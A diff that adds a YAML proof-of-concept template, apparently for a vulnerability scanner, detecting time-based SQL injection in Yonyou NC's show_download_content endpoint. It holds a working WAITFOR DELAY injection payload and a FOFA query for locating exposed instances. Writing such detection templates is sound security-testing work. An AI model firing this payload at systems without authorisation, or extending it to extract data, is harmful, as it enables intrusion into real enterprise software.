@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-nc-show-download-content-sqli
+info:
+  name: 用友NC show_download_content SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(3,8)
+  t2: t1 + 3
+requests:
+- method: GET
+  path: /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: 'status_code == 500 &&
+
+    contains(body,"Yonyou NC") &&
+
+    contains(headers,"/ebvp") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
